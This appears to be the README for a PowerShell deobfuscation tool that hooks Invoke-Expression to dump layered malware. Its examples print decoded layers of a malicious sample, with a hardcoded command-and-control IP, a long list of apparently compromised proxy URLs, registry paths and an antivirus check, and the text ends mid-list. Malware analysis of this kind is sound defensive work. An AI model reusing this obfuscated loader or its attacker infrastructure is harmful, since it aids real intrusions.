# IEX Huller

A script focuses on addressing the IEX obfuscation and multilayer encapsulation issue that the Rea-Team or malware author applied.

## Introduction

When you encounter an IEX-variant de-obfuscation case, replacing IEX to Write-* cmdlets by hand may be a temporary fix. But it's not a better choice especially when the sample is a Matryoshka. By using a name-conflict trick, this script provides an environment that the built-in Invoke-Expression cmdlet is shadowed/hid/hooked by our new IEX functions.

The new IEX function will be instructed to call recursively or just echo the expanded content and exit. With `-NoDryRun` switch, the script will invoke the built-in Invoke-Expression cmdlet to evaluate the expression. In the meantime, all layers' evaluated content including source code and variables will be dumped.

## Installation

```powershell
PS C:\Users\APP\Desktop> Import-Module ./Invoke-Obfuscation.psd1 -Force
```

## Usage

  * **Help**

```powershell
PS C:\Users\APP\Desktop> help Invoke-Expression2

NAME
    Invoke-Expression2

SYNOPSIS
    Invoke-Expression wrapper.


SYNTAX
    Invoke-Expression2 [-Command] <String> [-NoDryRun] [<CommonParameters>]
```

  * **Case 1 (dry-run)**: _echo_ the expanded content without actually evaulating the command.

```powershell
PS C:\Users\APP\Desktop> '.\hook_pwsh.ps1' | Invoke-Expression2
  ('7Up{iP} = (tnY{4}{2}{3}{1}{0}tnY-fB5d60B5d,B5d131:80B5d,B5dtB5d,B5dp://148.251.204.B5d,B5dhtB5d)
7Up{iD} = B5dB5d
7Up{Cs} = 1024
...
...
' | $ENV:pUBlic[13]+$enV:PublIC[5]+'x')
[*] Dump outermost layer to : .\IEXHuller_hook_pwsh_dryrun.txt
```

  * **Case 2 (no-dry-run)**: Runs commands or expressions on the local computer just like the original IEX cmdlet does while dumps every layer's content and the variables defined at runtime.

```powershell
PS C:\Users\APP\Desktop> Invoke-Expression2 .\tt\tt.ps1 -NoDryRun
[*] Dump Layer 1 to : .\tt\IEXHuller_tt_layer1_nodryrun.txt
[*] Dump Layer 2 to : .\tt\IEXHuller_tt_layer2_nodryrun.txt
[*] Dump Layer 3 to : .\tt\IEXHuller_tt_layer3_nodryrun.txt
[*] Dump Layer 4 to : .\tt\IEXHuller_tt_layer4_nodryrun.txt
[*] Dump Layer 5 to : .\tt\IEXHuller_tt_layer5_nodryrun.txt
[x] Built-in IEX exception: Exception calling "GetResponse" with "0" argument(s): "The request was aborted: Could not create SSL/TLS secure channel."
[*] Dump runtime variables to : .\tt\IEXHuller_tt_runtime_vars.txt
```

## Examples

  * [fe96a3c4384f43b0daa5681e9251f417efd3c568](./samples/fe96a3c4384f43b0daa5681e9251f417efd3c568.ps1) ([ref](https://pastebin.com/P5AK7div))

```powershell
PS C:\Users\APP\Desktop> Invoke-Expression2 .\samples\fe96a3c4384f43b0daa5681e9251f417efd3c568.ps1 -NoDryRun
[*] Dump Layer 1 to : .\sample\IEXHuller_fe96a3c4384f43b0daa5681e9251f417efd3c568_layer1_nodryrun.txt
[*] Dump Layer 2 to : .\sample\IEXHuller_fe96a3c4384f43b0daa5681e9251f417efd3c568_layer2_nodryrun.txt
[*] Dump runtime variables to : .\sample\IEXHuller_fe96a3c4384f43b0daa5681e9251f417efd3c568_runtime_vars.txt

PS C:\Users\APP\Desktop> Get-Content -Path .\samples\IEXHuller_fe96a3c4384f43b0daa5681e9251f417efd3c568_layer1_nodryrun.txt
  ('7Up{iP} = (tnY{4}{2}{3}{1}{0}tnY-fB5d60B5d,B5d131:80B5d,B5dtB5d,B5dp://148.251.204.B5d,B5dhtB5d)
7Up{iD} = B5dB5d
7Up{Cs} = 1024
7Up{m} = (tnY{0}{1}{2}tnY-fB5dbmxDB5d,B5dJY+B5d,B5d=B5d)
7Up{R} = ('+'((B'+'5d@*B5d+B5dFxz(B5d+B5d)B5d+B5dxCf[B5d+B5d_B5d) -crEPlaCe B5dFxzB5d,[char]36  -RePlACe ([char]120+[char]67+[char]102),[char]124))
7Up{tP2zSK} = (((tnY{2}{7}{10}{3}{11}{4}{1}{12}{5}{6}{9}{0}{8}tnY-fB5deB5d,B5d6DocuB5d,B5dC:EC6B5d,B5dC6PublB5d,B5dCB5d,B5dCB5d,B5d6sB5d,B5dUserB5d,B5dm.vbsB5d,B
5dystB5d,B5'+'dsEB5d,B5d'+'icEB5d,B5dment'+'sEB5d)).tnYREP2zpLAcEtnY(([ChAR]69+[ChAR]67+[ChAR]54),B5dXQIB5d))
7Up{S_P2zpath} = (((tnY{3}{1'+'}{0}{'+'2}{4}'+'tnY-f B5ds{0B5d,B5d}UserB5d,B5d}PubliB5d,B5dC:{0B5d,B5dc{0}DocumentsB5d)) -F  [ChaR]92)
7Up{cP2zmd} = B5dB5d
7Up{urP2zLP2z_SP2zeP2zRilIzE} = B5dB5d
7Up{alL_UP2zRL}      = B5dB5d
7Up{P'+'} = (('+'(tnY{0}{3}{1}{2}{5}{6}{4}tnY-f B5dHKCUB5d,B5dftB5d,B5dwaB5d,'+'B5d:CojSoB5d,B5djB5d'+',B5dreCB5d,B5doB5d)).tnYRepLaP2zCEtnY(([chAr]67+[chAr]111+
[chAr]106),[sTRinG][chAr]92))
7Up{LocaP2zL'+'P2zmacP2zHINE} = ('+'((tnY{0}{1}{2}{3}{4}tnY-f B5dHKLB5d,B5dM:QkOSB5d,B5dofB5d,B5dt'+'B'+'5d,B5dwareQkOB5d)) -RePlAcE B5dQkOB'+'5d,[CHAr]92)
7Up{K} = (tnY{0}{1}{3}{2}tnY-f'+'B5dBit'+'B5d,B5dDB5d,B5dfenderB5d,B5diB5d)
7Up{pRP2zOxY} = @(
(tnY{6}{7}{10}{5}{11}{15}{1}{12}{2}{14}{'+'9}{0}{4}{3}{8}{13}tnY -fB5dwordpress-imB5d,B5dsaB5d,B5dontent/pB5d,B5dorterB5d,B5dpB'+'5d,B5diplomatB5d,B5dhttpB5d,B5d
:B5d,B5d/B5d,B5dugins/B5d,B5d//dB5d,B5d.comB5d,B5d/wp-cB5d,B5dc'+'ache.php?c=B5d,B5dlB5d,B5d.B5d),
(tnY{5}{4}{2}{6}{1}{8}{7}{0}{3}tnY-fB5d?B5d,B5drB5d,B5d'+'ajacksoB5d,B5dc=B5'+'d,B5dtp:/'+'/www.vanessB5d,B5dhtB5d,B5dn.co.uk/w'+'oB5d,B5dphpB5d,B5dk.B5d),
('+'tnY{7}'+'{3}{5}{1}{6}{4}{0}{2}t'+'nY -fB5d/work.pB5d,B5d-traB5d,B5dhp?c=B5d,'+'B5dpB5d,B5domB5d,B5dear'+'headB5d,B5din'+'ing.cB'+'5d,B5dhttps://www.sB5d),
(tnY{0}{8}{10}{5}{13}{4}{2}{11}{6}{3}{'+'7}{12}{1}{9}tnY -f B5dhB5d,B5dom/vB5d,B5'+'digeB5d,B5dielB5d,B5dnB5d,B5d://B5d,B5dhitfB5d,B5ddB5d,B5dttB5d,B5d2/work.php
?c=B5d,B5dpB5d,B5dlwB5d,B5d.cB5d,B5dwww.B5'+'d),
(tnY{6}{0}{4}{8}{7}{2}{3}{9}{5}{1}{10}tnY-fB5d//B5d,B5dp?cB5d,B5dl/powB5d,B5deB5d,B5dwww.spearhead-trainB5d,B5dhB5d,B5dhttps:B5d,B5dmB5d,B5ding.com//htB5d,B5dr'+
'.pB5d'+',B5d=B5d),
(tn'+'Y{0}'+'{3}{6}{5}{7}{4}{'+'2}{1}tnY-fB5dhttB5d,B5dhp?c=B5d,B5d.pB5d,B5dp://wwB5d,B5dhow-workB5d,B5dlev8tor.cB5'+'d,B5dw'+'.eB5d,B5dom/sB5d),
(tnY{9}{11}{5}{8}{12}{0}{10}{4}{2}{1}{7}{3}{6}tnY-f B5dgr.nB5d,B5dce/lib/B5d,B5d-offiB5d,B5dork.phpB5d,B5dh/eB5d,B5datyB5d,B5d?c=B5d,B5dwB5d,B5danB5d,'+'B5dhttp:
//B5d,B5dfe.go.tB5d,B5dwB5d,B5daB5d),
(tnY{1}{5}{7}{3}{8}{0}{9}{2}{4}{6}tnY -fB5d.cB5d,B5dhttp://mB5d,B5drk.'+'B5d,B5da'+'B5d,B5dphp?cB5d,B5daiB5d,B5d=B5d,B5dnB5d,B5dndstrandB5d,B5dom/woB5d),
(tnY{9}'+'{1}{5}{0}{6}{2}{8}{7}{10}{4}{3}tnY -f B5dth/watB5'+'d,B'+'5dtpB5d,B5dnaB5d,B5dc=B'+'5d,B5dwer.php?B'+'5d,B5d://watyanagr.nfe.go.B5d,B5dyaB5d,B5drB5d,B5
dgB5d,B5dhtB5'+'d,B5d/poB5d),
(tnY{7}{2}{1}{0}{3}{4}{6}{5}tnY-f B5d.jdarchs.com'+'B5d,B5dwB5d,B5dwB5d,B5d/B5d,B5d'+'woB5d,B5d.php?c=B5d,'+'B5drkB5d,B5dhttp://wB5d),
(tnY{1}{4}{7}{0}{5}{'+'10}{12}{14}{6}{8}{11}{2}{9}{3}{13}tnY-fB5d//wwwB5d,B5dhttB5d,B5drkB5d,B5dp?cB5d,B5d'+'pB5d,B5d.akhtaB5d,B5dileB5d,B5d:B5d,B5d/sB5d,B5d.phB
5d,B5dredanesh.coB5d,B5d'+'ym/woB5d,B5dmB5d,B5d=B5d,B5d/d/fB5d),
(tnY{8}{5}{4}{0}{7}{2}{6}{1}{3}tnY-f B5d87.38B5d,B5dork.php'+'?B5d,B5dhort_qrB5d,B5dc=B5d,B5d//106.1B5d,B5'+'dtp:B5d,B5d'+'/wB5d,B5d.2'+'1/sB5d,B5dhtB5d)'+',
(tnY{11}{5}{3}{4}{10}{0}{12}{1}{9}{2}{6}{7}{8}tnY-f B5desh.com/d/osB5d,B5dhoB5d,B5dl/pB5d,B5dkB5d,B5d'+'htareB5d,B5dttp://www.aB5d,B5dower.phpB5d,B5d?B5d,B5dc=B5
d,B5doB5d,B5ddanB5d,B5dhB5d,B5dcB5d),
(tnY{3}{6}{12}{10}{11}{5}{4}{0}{2}{1'+'}{8}{9}{7}tnY -f B5decreatiB5d,B5dm/wB5d,B5dve.coB5d,B5dhB5d,B5dadB5d,B5darcB5d,B5dtB5d,B5d.php?c=B5d,B5doB5d,B5drkB5d,B5d
p://wwB5d,B5dw.B5d,B5dtB5d),
(tnY{1}{11}{8}{6}{0}{1'+'0}{7}{'+'3}{5}{9}{4}{2}tnY-fB5dp-includB5d,B5dhttp:/B5d,B5dhp?c=B5d,B'+'5ddgetB5d,B5'+'d.pB5d,B5ds/worB5d,B5dbr/wB5d,B5d/wiB5d,B5dexbras
ilia.com.B5d,B5dkB5d,B5desB5d,'+'B5'+'d/cbpB5d),
(tnY{4}{1}{3}{0}{5}{2}tnY-f B5dowB5d,B5dtp://whiver.inB5d,B5d?c=B5d,B5d/pB5d,B5dhtB5d,B5'+'der.phpB5d),
(tnY{11}{1}{12}{3}{7}{10}{6}{9}{0}{8}{4}{5}'+'{2}tnY-f B5drdpress-seo/B5d,B5d://cB5d,B5dphp?c='+'B5d,B5d/wpB5d,B5dowerB5d,B5d.B5d,B5d/p'+'lugB5d,B5d-contenB5d,B5
dpB5d,B5dins/woB5d,B5dtB5d,B5dhttpB5d,B5dbpexbrasilia.com.brB5d)
(tnY{2}{4}{0}{1}{3}{5}tnY -f B5dhB5d,B5dat.B5d,B5dhttB5d,B5deu/log'+'s.phpB5d,B5dp://feribscB5d,B'+'5d?c=B5d),
(tnY{11}{2}{12}{6}{0}{9}'+'{13}{8}{4}{10}{1}{3}{5}{14}{7}tnY -fB5dipB5d,B5dugB5d,B5dtB5d,B5dins/wpdB5d,B5d.com/wB5d,B'+'5dataB5d,B5dsulB5d,B5dp?c=B5d,B5drdaB5d,B
5darwB5d,B5dp-content/plB'+'5d,B5dhtB5d,B5dp://azmwn.B5d,B5daB5d,B5dtables/panda.phB5d),
(tnY{8}{0}{5}{9}{3}{1}{2}{6}{4}{7}tnY -fB5dttB5d,B5dcoB5d,B5dmB5d,B5dic.B5d,B5dp?cB5d,B5dp://www.armahoB5d,B5d/list.phB5d,B'+'5d=B5d,B5dhB5d'+',B5dlB5d),
(tnY{13}{8}{0}{11}{10}{'+'1}{12}{7}{2}{6}{14}{9}{3}{5}{4}tnY -fB5dwB5d,B5dparwB5d,B5dcom/wp-B5d,B5difB5d,B5den/logs.php?c=B'+'5d,B5dteB5d,B5dcoB5d,B5dda.B5d,B5d/
/azmB5d,B5dyfB5d,B5d.suliB5d,B5dnB5d,B5darB5d,B5dhttp:B5d,B5dntent/themes/twentB5d),
(tnY{4}{9}{10}{3}{2}{'+'5}{8}{1}{7}{0}{6}tnY-f B5dalt.pB5d,B5daspB5d,B5dorB5d,B5dpa.B5d,B5dhttpB5d,B5dgB5d,B5d'+'hp?c=B5d,B5dhB5d,B5d/B5d,B5d://wwwB5'+'d,B5d.eaB
5d),
(tnY{11}{10}{14}{6}{9}{15}{2}{8}{1}{3}{7}{0}{4}{12}{5}{1'+'3}tnY -f B5ds/B5d,B5dlugB5d,B5donteB5d,B5diB5d,B5dentryB5d,B5dpB5d'+','+'B5darda.coB5d,B5dnB5'+'d,B5dn
t/pB5d,B5dm/wp-'+'B5d,B5d//sulB5d,B5dhttp:B'+'5d,B5d-views/work.B5d,B5dhp?c=B5d,B5diparwB'+'5d'+',B5'+'dc'+'B5d),
(tnY{14}{5}{9}{10}{8}{11}{0}{3}{1}{12'+'}'+'{4}{6}{13}{7}{2}tnY-fB5doB5d,B5d.oB5d,B5d=B5d,B5drldB5d,B5datB5d'+',B5dhB5d,B5deB5d,B5dhp?cB5d,B5dmorroB5d,B5dapingB5
d,B5dtoB5d,B5dwswB5d,B5drg/cB5d,B5dgory.pB5d,B5dhttp://www.sB5d),
(tnY{1}{9}{0}{4}{7}{10}{2}{3}{6}{8}{5}{11}tnY-fB5diparwarB5d,B5dhB5d,B5ds/twentyB5d,B5dfiB5d,B5ddB5d,B5dhp?cB5d,B5dftB5d,B5daB5'+'d,B5deen/work.pB5d,B5dttp://sul
B5d,B5d.com/wp-content/t'+'hemeB5d,B5d=B5d),
(tnY{7}{8}{3}{4}{5}{9}{1}{6}{2}{0}{10}tnY -fB5dkers.pB5d,B5dorgB5d,B5daB5d,B5dtB5d,B5dp://banB5d,B5dgortalkB5d,B5d.uk/speB5d,B5'+'dhB5d,B5dtB5d,B5d.B5d,B5dhp?c=B
5d),
(tnY{4}{2}{11}{9}{6}{8}{1}{0}{3}{5}{10}{12}{7}tnY-f B5dcludes/custB5d,B5di'+'nB5d,B5dps://wallB5d,B5doB5d,B'+'5dhttB5d,B5dmize/logs.B'+'5d,B5d.coB5d,B5d=B5d,B5dm
/wp-B5d,B5dercaseB5d,B5dpB5d,B5dpapB5d,B5dhp?cB5d),
('+'tnY{1}{6}{2}{4}{3}{5}{9}{8}{7}{0}tnY-f B5dhp?c=B5d,B5dhB5d,B5dw'+'B5d,B5didefoxB5d,B5dw.rB5d,B5d.com/B5d,B5dttp://wB5d,B5dt.pB5d,B5dten'+'B5d,B5dconB5d),
(tnY{13}{16}{4}{3}{15}{12}{9}{0}{5}{1'+'7}{11}{8'+'}{1}{14}{7}{18}{2}{6}{10}tnY -f B5d-co'+'nteB5d,B5dtB5d,B5de'+'en'+'/lB5d,B5dlB5d,B5dps://walB5d,B5dnB5d,B5dog
s.phpB5d,B5difB5d,B5ds/B5d,B5dercase.com/wpB5d,B5d?c=B5d,B5deB5d,B5dapB5d,B5dhtB5d,B5dwentyfB'+'5d,B5dpB5d,B5dtB5d,B5dt/themB5d,B5dtB5d),
(tnY{4}{'+'9}{8}{6}{3}{1'+'}{2}{'+'7}{0}{5}tn'+'Y-fB5dionB5d,B5d/B5d,B5dpB5d,B5dgB5d,B5dhttpB5d,B5d.php?c=B5d,B5dcks.orB5d,B5dublicatB5d'+',B5da.induB5d,B5ds://c
oB5d),
(tnY{10}{16}{6}{8}{2}{7}{1}{3}{18}{0}{4}{9'+'}{5}{12}'+'{11}{13}{17}{15}{14}'+'tnY -'+'f B5duB5d,B5dwp-B5d,B5dyaran.cB'+'5'+'d,B5dconB5d,B5dgB5'+'d,B5do-ma'+'B5d
,B5d://w'+'wB5d,B5do//B5d,B5dw.B5d,B5dins/sB5d,B5dhB'+'5d,B5do'+'nry/logs.B5d,B5dsB5d,B5dpB5d,B5dc=B5d,B5d?B5d,B5dttpB5d,B5dhpB5d,B5dtent/plB5d),
(tnY{3}{9}{1}{4}{2}'+'{6}{8}{7}{0}{5}tnY-f B5dews.phB5d,B5d/wB5d,B5d.dafB5d,B5dhtB5d,B5dwwB5d,B5dp?c=B5d,B5dc.co.uB5d,B5d/nB5d,B5dkB5d,B5dtp:/B5d),
(tnY'+'{5}{9}{3}{4}{8}{2}{6}{7}{0}{1}tnY -fB5d/widgets/logs.php?cB5d,B5d=B5d,B5duB5d,B5daranB5d,B5d.co/wp-iB5d,B5dhttp://www.B5d,B5ddeB5d,B5dsB5d,B5dnclB5'+'d'+'
,B5dyB5d),
(tnY{5}{0}{2}{3}{4}{1}{7}{6'+'}tnY-f B5dps://mhtevB5d,B5dcom/account.phpB5d,B5denB5d,B5dtsB5d,B5d.B5d,B'+'5dhttB5d,B5d=B5d,B5d?cB5d),
(tnY{7}{3}{2}{0}{4}{8}{1}{6}{5}tnY -f B5dmax.'+'com/fiB5d,B5diclesB'+'5d,B5d-B5d,B5d.asanB5d,B5dleB5d,B5dspx?c=B5d,B5d/css.aB5d,B5dhttp://wwwB5d,B5ds/artB5d),
'+'(tnY{2}{3}{4}{9}{7}{6'+'}{8}{'+'10}{0}{5}{1}tnY -f B5db'+'/browse_'+'caB5d,B5d.php?c=B5'+'d,B5dhtB5d,B5dtp:/B5d,B5d/best2.B5d,B5dtB5d,B5dnfeB5d,B5dcoB5d,B5dre
B5d,B5dthebestB5d,B5dnce.org/ccB5d),
(tnY{7}{9}{1}{6}{4}{2}{3}{8}{5}{0}tnY-f B5daspx?c=B5d,B5dwww.asan-'+'B5d,B5diB5d,B5dcleB5d,B5d/artB5d,B5d/large/css.B'+'5d,B5dmax.com/filesB5d,B5dhB5d,B5dsB5d,B5
dttp://B5d'+'),
(tnY{7}{0}{4}{5}{1}{3}{6}{2}tnY -f B5d//w'+'wB5d,B5d.com/mic_cB5d,'+'B5dphp?c=B5d,B5datB5d,'+'B5dw.mitegB5d,'+'B5denB5d,B5dalog.'+'B5d,B5dhttp:B5'+'d),
(tnY{7}{6}{3}'+'{4}{1}{8}'+'{5}{10}{2}{11}{9}{0}tnY-fB5dx?c=B5d,B5dg'+'B5d,B5d/'+'B5d,B5dp://mB5d,B5daB5d,B5dcal-eneB5d,B5dtB5d'+',B5dhtB5d,B5diB5d,B5d.aspB5d,B5
drgy.com/cssB5d,B5dcssB5d),
(tnY{1}{0}{6}{5}{11}{3}{7}{10}{4}{9}{12}{2}{8}tnY-fB5d.B5d'+',B5dhttp://wwwB5d,B5d?B5d,B5daB5d,B5doB5d,B5deB5d,B5dpomB5d,B5dtB5d,B5dc=B5d,B5drg/B5d,B5des.B5d,B5d
granB5d,B5dindex.phpB5d),
(tnY{0}{6}{5}{8}{2}{7}{4}{3}{1}tnY -fB5dhB5d,B5d?c=B5d,B5dcom/cB5d,B'+'5dxB5d,B5d.aspB5'+'d,B5d://magicalB5'+'d,B5dttpB5d,B5dssB5d,B5d-e'+'nergy.B5d),
(tnY{0}{3}{1}{5}{6}{4}{2}tnY -f B5dhB5d,B5d//wwwB5d,B5d?c=B5d,B5dttp:B5d'+',B5ds.hr/index.phpB5'+'d,B5d.aB5d,B5dutotranB5d),
(tnY{3'+'}{2}{6}{'+'4}{7}{0}{1}{5}'+'tnY -f B5d'+'om/cB5d,B5dsB5d,B5d//riyaB5d,B5dhttp:B5'+'d,B5dhfoodB5d,B'+'5ds/edu.aspx?c=B5d,B5ddB5d,B5ds.cB5d),
(tnY{1}{8}{2}{6}{0}{3}{10}{9}{12}{5}{11}{7}{4}tnY-f B5dlsB5d,B5dhtB5d,B5dpsB5d,B5dcB5d,B5d=B5d,B5daB5d,B5d://skept'+'icaB5d,B5ds.php?cB5d,B'+'5dtB5'+'d,B5de.B5d,
B5diencB'+'5d,B5dphicB5d,B5dcom/grB5d),
(tnY{'+'1}{9}{6}{'+'5}{3}{10}{12}{2}{8}{4}{11}{7}{0}tnY -f B5dry.aspx?c=B5d,B5'+'dhttp:B5d,B5dueB5d,B5dhfooB5d,B5d-uiB5d,B5dadB5d,B5dyB5'+'d,B5djs/jqueB5d,B5dryB
5d,B5d//riB5d,B5'+'dds.comB5d,B5d/B5d,B5d/j'+'qB5d),
(tnY{1'+'}{6}{7}{3}{0}{8}{4}{5}{9}{2}tnY -f B5d'+'u/B5d,B5dhtB5d,B5d=B5d,B5dmclub.eB5d,B5d'+'aB5d,B5dta.B5d,B5dtp:/B5d,B5d/tB5d,'+'B5dclubdB5d,B5dphp'+'?cB5d),
'+'(tnY{4}{9}{1}{2}{5}{7}'+'{3}'+'{8}{6}{0}tnY -f B5dc='+'B5d,B5dkrooan'+'B5'+'d,B5dn.comB5d,B5drB5d,B5dhttp://wwwB5d,B5d/inc/wB5d,B5d.php?B5d,B5doB5d,B5dkB5d,B5
d.kunB5d),
(tnY{6}{2}{3}{8}{4}{0}{5}'+'{1}'+'{7'+'}tnY-fB5'+'dp.pB5d,B5dcB5d,B5dtB5d,B5dp://www.ztB5d,B5dw.p'+'l/poB5d,B5dhp?B5d,B5dhtB5d,B5d=B5d,B5dm.w'+'aB5d),
(tnY{0}{11}{5}{12}{7}{10}{6}{9}{2}{1}{3}{4}{8}{13}tnY-f B5dhttp://B5d,B5dntsB5d,B5domponeB5d,B5d/com_akB5d,B5deebB5'+'d,B5dool.B5d,B5doB5d,B5duliparwaB5d,B5da/wo
B5d,B5dm/cB5d,B5drda.cB5d,B5dschB5d,B5dsB5d,B5drk.php?c=B5d),
(tnY{4}'+'{1}{0}{2}{3}{7}{5}{8}{6}tnY-f B5dwB5d,B5dtp://B5d,B5dww.mackellarsB5d,B5dcree'+'nwo'+'rks.com/B5d,B5dhtB5d,B5drk.phpB5d,B5d=B5d,B5dwoB5d,B5d?cB5d),
(tnY{13}{0}{10}{3}{2}{1}{11}{9'+'}{12}{8}{5}{6}{4}{14}{7'+'}tnY -f B5dttB5d,B5dwB5d,B5dl.suliparB5d,B5doB5d,B5dorB5d,B5ded'+'itors/codemirror/B5d,B5dwB5d,B5dhp?c
=B5d,B5d/B5d,B5dluB5d,B5dp://s'+'choB5d,B5darda.com/pB5d,B5dginsB5d,B5dhB5d,B5dk.pB5d),
(tnY{9}{3}{0}{1}{7}{6}{8}{4}{5}{2}tnY-fB5dwwwB5d,B5d.arcaB5d,B5drk.php?c=B5d,B5dtp://B5d,B5dm/B5d,B5dwoB5d,B5dre'+'aB5d,B5ddecB5d,B5dtive.coB5d,B5dhtB5d)
)
').REpLaCE(([chaR]80+[chaR]50+[chaR]122),'`').REpLaCE('7Up',[StriNG][chaR]36).REpLaCE(([chaR]88+[chaR]81+[chaR]73),[StriNG][chaR]92).REpLaCE('tnY',[StriNG][chaR]
34).REpLaCE('B5d',[StriNG][chaR]39)| .( $ENV:pUBlic[13]+$enV:PublIC[5]+'X')

PS C:\Users\APP\Desktop> Get-Content -Path .\samples\IEXHuller_fe96a3c4384f43b0daa5681e9251f417efd3c568_layer2_nodryrun.txt
${iP} = ("{4}{2}{3}{1}{0}"-f'60','131:80','t','p://148.251.204.','ht')
${iD} = ''
${Cs} = 1024
${m} = ("{0}{1}{2}"-f'bmxD','JY+','=')
${R} = ((('@*'+'Fxz('+')'+'xCf['+'_') -crEPlaCe 'Fxz',[char]36  -RePlACe ([char]120+[char]67+[char]102),[char]124))
${t`SK} = ((("{2}{7}{10}{3}{11}{4}{1}{12}{5}{6}{9}{0}{8}"-f'e','6Docu','C:EC6','C6Publ','C','C','6s','User','m.vbs','yst','sE','icE','mentsE'))."RE`pLAcE"(([ChAR
]69+[ChAR]67+[ChAR]54),'\'))
${S_`path} = ((("{3}{1}{0}{2}{4}"-f 's{0','}User','}Publi','C:{0','c{0}Documents')) -F  [ChaR]92)
${c`md} = ''
${ur`L`_S`e`RilIzE} = ''
${alL_U`RL}      = ''
${P} = ((("{0}{3}{1}{2}{5}{6}{4}"-f 'HKCU','ft','wa',':CojSo','j','reC','o'))."RepLa`CE"(([chAr]67+[chAr]111+[chAr]106),[sTRinG][chAr]92))
${Loca`L`mac`HINE} = ((("{0}{1}{2}{3}{4}"-f 'HKL','M:QkOS','of','t','wareQkO')) -RePlAcE 'QkO',[CHAr]92)
${K} = ("{0}{1}{3}{2}"-f'Bit','D','fender','i')
${pR`OxY} = @(
("{6}{7}{10}{5}{11}{15}{1}{12}{2}{14}{9}{0}{4}{3}{8}{13}" -f'wordpress-im','sa','ontent/p','orter','p','iplomat','http',':','/','ugins/','//d','.com','/wp-c','ca
che.php?c=','l','.'),
("{5}{4}{2}{6}{1}{8}{7}{0}{3}"-f'?','r','ajackso','c=','tp://www.vaness','ht','n.co.uk/wo','php','k.'),
("{7}{3}{5}{1}{6}{4}{0}{2}" -f'/work.p','-tra','hp?c=','p','om','earhead','ining.c','https://www.s'),
("{0}{8}{10}{5}{13}{4}{2}{11}{6}{3}{7}{12}{1}{9}" -f 'h','om/v','ige','iel','n','://','hitf','d','tt','2/work.php?c=','p','lw','.c','www.'),
("{6}{0}{4}{8}{7}{2}{3}{9}{5}{1}{10}"-f'//','p?c','l/pow','e','www.spearhead-train','h','https:','m','ing.com//ht','r.p','='),
("{0}{3}{6}{5}{7}{4}{2}{1}"-f'htt','hp?c=','.p','p://ww','how-work','lev8tor.c','w.e','om/s'),
("{9}{11}{5}{8}{12}{0}{10}{4}{2}{1}{7}{3}{6}"-f 'gr.n','ce/lib/','-offi','ork.php','h/e','aty','?c=','w','an','http://','fe.go.t','w','a'),
("{1}{5}{7}{3}{8}{0}{9}{2}{4}{6}" -f'.c','http://m','rk.','a','php?c','ai','=','n','ndstrand','om/wo'),
("{9}{1}{5}{0}{6}{2}{8}{7}{10}{4}{3}" -f 'th/wat','tp','na','c=','wer.php?','://watyanagr.nfe.go.','ya','r','g','ht','/po'),
("{7}{2}{1}{0}{3}{4}{6}{5}"-f '.jdarchs.com','w','w','/','wo','.php?c=','rk','http://w'),
("{1}{4}{7}{0}{5}{10}{12}{14}{6}{8}{11}{2}{9}{3}{13}"-f'//www','htt','rk','p?c','p','.akhta','ile',':','/s','.ph','redanesh.co','ym/wo','m','=','/d/f'),
("{8}{5}{4}{0}{7}{2}{6}{1}{3}"-f '87.38','ork.php?','hort_qr','c=','//106.1','tp:','/w','.21/s','ht'),
("{11}{5}{3}{4}{10}{0}{12}{1}{9}{2}{6}{7}{8}"-f 'esh.com/d/os','ho','l/p','k','htare','ttp://www.a','ower.php','?','c=','o','dan','h','c'),
("{3}{6}{12}{10}{11}{5}{4}{0}{2}{1}{8}{9}{7}" -f 'ecreati','m/w','ve.co','h','ad','arc','t','.php?c=','o','rk','p://ww','w.','t'),
("{1}{11}{8}{6}{0}{10}{7}{3}{5}{9}{4}{2}"-f'p-includ','http:/','hp?c=','dget','.p','s/wor','br/w','/wi','exbrasilia.com.','k','es','/cbp'),
("{4}{1}{3}{0}{5}{2}"-f 'ow','tp://whiver.in','?c=','/p','ht','er.php'),
("{11}{1}{12}{3}{7}{10}{6}{9}{0}{8}{4}{5}{2}"-f 'rdpress-seo/','://c','php?c=','/wp','ower','.','/plug','-conten','p','ins/wo','t','http','bpexbrasilia.com.br')
("{2}{4}{0}{1}{3}{5}" -f 'h','at.','htt','eu/logs.php','p://feribsc','?c='),
("{11}{2}{12}{6}{0}{9}{13}{8}{4}{10}{1}{3}{5}{14}{7}" -f'ip','ug','t','ins/wpd','.com/w','ata','sul','p?c=','rda','arw','p-content/pl','ht','p://azmwn.','a','tab
les/panda.ph'),
("{8}{0}{5}{9}{3}{1}{2}{6}{4}{7}" -f'tt','co','m','ic.','p?c','p://www.armaho','/list.ph','=','h','l'),
("{13}{8}{0}{11}{10}{1}{12}{7}{2}{6}{14}{9}{3}{5}{4}" -f'w','parw','com/wp-','if','en/logs.php?c=','te','co','da.','//azm','yf','.suli','n','ar','http:','ntent/t
hemes/twent'),
("{4}{9}{10}{3}{2}{5}{8}{1}{7}{0}{6}"-f 'alt.p','asp','or','pa.','http','g','hp?c=','h','/','://www','.ea'),
("{11}{10}{14}{6}{9}{15}{2}{8}{1}{3}{7}{0}{4}{12}{5}{13}" -f 's/','lug','onte','i','entry','p','arda.co','n','nt/p','m/wp-','//sul','http:','-views/work.','hp?c=
','iparw','c'),
("{14}{5}{9}{10}{8}{11}{0}{3}{1}{12}{4}{6}{13}{7}{2}"-f'o','.o','=','rld','at','h','e','hp?c','morro','aping','to','wsw','rg/c','gory.p','http://www.s'),
("{1}{9}{0}{4}{7}{10}{2}{3}{6}{8}{5}{11}"-f'iparwar','h','s/twenty','fi','d','hp?c','ft','a','een/work.p','ttp://sul','.com/wp-content/theme','='),
("{7}{8}{3}{4}{5}{9}{1}{6}{2}{0}{10}" -f'kers.p','org','a','t','p://ban','gortalk','.uk/spe','h','t','.','hp?c='),
("{4}{2}{11}{9}{6}{8}{1}{0}{3}{5}{10}{12}{7}"-f 'cludes/cust','in','ps://wall','o','htt','mize/logs.','.co','=','m/wp-','ercase','p','pap','hp?c'),
("{1}{6}{2}{4}{3}{5}{9}{8}{7}{0}"-f 'hp?c=','h','w','idefox','w.r','.com/','ttp://w','t.p','ten','con'),
("{13}{16}{4}{3}{15}{12}{9}{0}{5}{17}{11}{8}{1}{14}{7}{18}{2}{6}{10}" -f '-conte','t','een/l','l','ps://wal','n','ogs.php','if','s/','ercase.com/wp','?c=','e','a
p','ht','wentyf','p','t','t/them','t'),
("{4}{9}{8}{6}{3}{1}{2}{7}{0}{5}"-f'ion','/','p','g','http','.php?c=','cks.or','ublicat','a.indu','s://co'),
